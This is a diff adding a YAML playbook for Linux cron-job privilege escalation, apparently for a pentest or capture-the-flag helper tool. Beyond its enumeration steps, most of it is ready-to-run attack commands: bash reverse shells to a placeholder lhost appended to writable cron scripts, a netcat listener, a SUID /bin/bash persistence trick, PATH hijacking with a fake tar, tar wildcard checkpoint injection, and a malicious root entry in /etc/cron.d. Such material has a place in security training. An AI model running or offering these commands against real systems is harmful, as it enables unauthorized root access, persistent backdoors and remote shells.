@@ -1,0 +1,351 @@
+name: Linux Cron Job Abuse
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE CRON JOBS
+# =========================================================
+- title: Enumerate Cron Jobs
+  mode: enum
+  info: |
+    Identify scheduled tasks, cron jobs, timers, and writable scripts.
+
+  entries:
+
+    - cmd: "crontab -l"
+      info: current user crontab
+
+    - cmd: "sudo crontab -l"
+      info: root crontab (if sudo allowed)
+
+    - cmd: "ls -lah /etc/cron*"
+      info: enumerate cron directories
+
+    - cmd: "cat /etc/crontab"
+      info: system-wide crontab
+
+    - cmd: "find /etc/cron* -type f 2>/dev/null"
+      info: enumerate cron files
+
+    - cmd: "systemctl list-timers --all"
+      info: systemd timers
+
+    - cmd: "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null"
+      info: world writable files
+
+  look_for:
+    - writable scripts
+    - writable cron.d files
+    - custom scripts
+    - backup jobs
+    - root-owned jobs
+    - unusual schedules
+    - PATH usage
+    - wildcards
+
+  notes:
+    - cron jobs often run as root
+    - backup scripts are common targets
+    - writable scripts are high-value findings
+
+
+# =========================================================
+# [2] IDENTIFY RUNNING CRON JOBS
+# =========================================================
+- title: Identify Running Jobs
+  mode: enum
+  info: |
+    Observe scheduled tasks in real time.
+
+  entries:
+
+    - cmd: "./pspy64 -pf -i 1000"
+      info: monitor processes without root
+
+    - cmd: "ps aux | grep cron"
+      info: cron processes
+
+    - cmd: "grep CRON /var/log/syslog"
+      info: cron execution logs
+
+    - cmd: "journalctl -u cron"
+      info: cron journal logs
+
+  look_for:
+    - root executing scripts
+    - recurring commands
+    - backup tasks
+    - shell scripts
+    - writable paths
+
+  notes:
+    - pspy is one of the best cron enumeration tools
+    - identify exact execution frequency
+    - watch for scripts executed as root
+
+
+# =========================================================
+# [3] ENUMERATE WRITABLE SCRIPTS
+# =========================================================
+- title: Writable Script Abuse
+  mode: enum
+  info: |
+    Find scripts executed by cron that can be modified.
+
+  entries:
+
+    - cmd: "find / -type f -writable 2>/dev/null"
+      info: writable files
+
+    - cmd: "ls -lah /path/to/script.sh"
+      info: check permissions
+
+    - cmd: "cat /path/to/script.sh"
+      info: inspect cron script
+
+  look_for:
+    - root execution
+    - writable scripts
+    - backup automation
+    - shell execution
+    - tar commands
+    - PATH usage
+
+  notes:
+    - appending payloads is safer than replacing scripts
+    - preserve original functionality when possible
+    - always back up scripts before editing
+
+
+# =========================================================
+# [4] REVERSE SHELL PAYLOADS
+# =========================================================
+- title: Cron Reverse Shell
+  mode: chain
+  info: |
+    Append a reverse shell payload to a writable cron script.
+
+  entries:
+
+    - cmd: "echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /path/to/script.sh"
+      info: bash reverse shell
+
+    - cmd: "nc -lvnp {lport}"
+      info: start listener
+
+    - cmd: "chmod +x /path/to/script.sh"
+      info: ensure executable
+
+  look_for:
+    - incoming shell
+    - root connection
+    - cron execution timing
+
+  notes:
+    - wait for next cron execution
+    - common intervals are 1, 3, 5, or 15 minutes
+    - cron shells are often non-interactive initially
+
+
+# =========================================================
+# [5] ADD SUID BINARY VIA CRON
+# =========================================================
+- title: Add SUID Binary
+  mode: chain
+  info: |
+    Use cron execution to create a persistent SUID root shell.
+
+  entries:
+
+    - cmd: "echo 'chmod u+s /bin/bash' >> /path/to/script.sh"
+      info: make bash SUID
+
+    - cmd: "/bin/bash -p"
+      info: spawn root shell
+
+    - cmd: "find / -perm -4000 2>/dev/null"
+      info: verify SUID
+
+  look_for:
+    - SUID bash
+    - root privileges
+
+  notes:
+    - persistent access method
+    - works well when reverse shells are filtered
+    - remove artifacts after use in real engagements
+
+
+# =========================================================
+# [6] CRON PATH HIJACKING
+# =========================================================
+- title: Cron PATH Hijacking
+  mode: chain
+  info: |
+    Exploit cron jobs executing binaries without full paths.
+
+  entries:
+
+    - cmd: "cat /etc/crontab"
+      info: inspect PATH variable
+
+    - cmd: "echo $PATH"
+      info: current PATH
+
+    - cmd: "echo '/bin/bash -p' > tar"
+      info: malicious binary
+
+    - cmd: "chmod +x tar"
+      info: executable payload
+
+    - cmd: "export PATH=.:$PATH"
+      info: prepend current directory
+
+  look_for:
+    - commands without full paths
+    - writable PATH directories
+    - relative execution
+
+  notes:
+    - cron often uses limited PATH
+    - relative binary execution is dangerous
+    - common targets include tar, cp, rsync, backup tools
+
+
+# =========================================================
+# [7] TAR WILDCARD ABUSE
+# =========================================================
+- title: Tar Wildcard Injection
+  mode: chain
+  info: |
+    Abuse tar wildcard expansion in cron backup scripts.
+
+  entries:
+
+    - cmd: "echo 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' > shell.sh"
+      info: payload script
+
+    - cmd: "chmod +x shell.sh"
+      info: executable payload
+
+    - cmd: "touch -- '--checkpoint=1'"
+      info: tar checkpoint option
+
+    - cmd: "touch -- '--checkpoint-action=exec=sh shell.sh'"
+      info: command execution
+
+  look_for:
+    - tar commands
+    - wildcard usage
+    - backup automation
+
+  notes:
+    - very common HTB privesc
+    - works when tar uses *
+    - cron backup jobs are ideal targets
+
+
+# =========================================================
+# [8] WRITABLE CRON.D FILES
+# =========================================================
+- title: Writable cron.d Abuse
+  mode: chain
+  info: |
+    Add malicious cron entries if cron configuration files are writable.
+
+  entries:
+
+    - cmd: "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' >> /etc/cron.d/pwn"
+      info: add malicious cron job
+
+    - cmd: "chmod 644 /etc/cron.d/pwn"
+      info: proper cron permissions
+
+    - cmd: "nc -lvnp {lport}"
+      info: listener
+
+  look_for:
+    - writable cron.d
+    - incoming root shell
+
+  notes:
+    - cron.d files require proper formatting
+    - malformed cron files may fail silently
+    - one-minute execution is common
+
+
+# =========================================================
+# [9] COMMON CRON LOCATIONS
+# =========================================================
+- title: Common Cron Locations
+  mode: enum
+  info: |
+    Enumerate standard cron paths and scheduled task locations.
+
+  entries:
+
+    - cmd: "ls -lah /etc/cron.hourly"
+      info: hourly jobs
+
+    - cmd: "ls -lah /etc/cron.daily"
+      info: daily jobs
+
+    - cmd: "ls -lah /etc/cron.weekly"
+      info: weekly jobs
+
+    - cmd: "ls -lah /etc/cron.monthly"
+      info: monthly jobs
+
+    - cmd: "ls -lah /etc/cron.d"
+      info: custom cron jobs
+
+    - cmd: "ls -lah /var/spool/cron/crontabs"
+      info: user cron jobs
+
+  look_for:
+    - writable jobs
+    - custom scripts
+    - backup tasks
+    - root-owned automation
+
+  notes:
+    - cron.daily frequently contains vulnerable scripts
+    - third-party apps often misuse cron.d
+    - backups are the most common cron abuse vector
+
+
+# =========================================================
+# [10] CRON PRIVESC WORKFLOW
+# =========================================================
+- title: Cron Privesc Workflow
+  mode: enum
+  info: |
+    Practical methodology for cron privilege escalation.
+
+  entries:
+
+    - cmd: "1. Enumerate cron jobs"
+      info: discovery
+
+    - cmd: "2. Identify writable scripts/files"
+      info: misconfiguration hunting
+
+    - cmd: "3. Monitor execution with pspy"
+      info: execution timing
+
+    - cmd: "4. Inspect backup scripts"
+      info: common target
+
+    - cmd: "5. Append payload safely"
+      info: preserve functionality
+
+    - cmd: "6. Trigger reverse shell or SUID"
+      info: root access
+
+    - cmd: "7. Check PATH and wildcard abuse"
+      info: alternative vectors
+
+  notes:
+    - cron abuse is common on easy and medium Linux boxes
+    - pspy dramatically improves cron enumeration
+    - writable backup scripts are the highest-value targets
